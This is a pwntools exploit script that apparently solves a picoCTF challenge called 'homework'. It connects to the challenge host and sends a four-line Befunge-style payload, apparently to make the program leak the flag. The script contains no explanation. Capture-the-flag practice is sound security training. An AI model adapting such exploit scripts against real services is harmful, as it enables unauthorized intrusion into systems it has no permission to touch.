#!/usr/bin/env python3
from pwn import *

PORT = 31689
HOST = "mars.picoctf.net"
elf = context.binary = ELF('./homework', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force

            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

#GDB()

payload = [
b"20!:+:+:+:0!::++-00gp",
b"0!0g0!:+/0!0g*v",
b">:0g,0!+vAAAAA<",
b"^AAAAAAA<"
]

for pl in payload:
	p.sendline(pl)

p.interactive()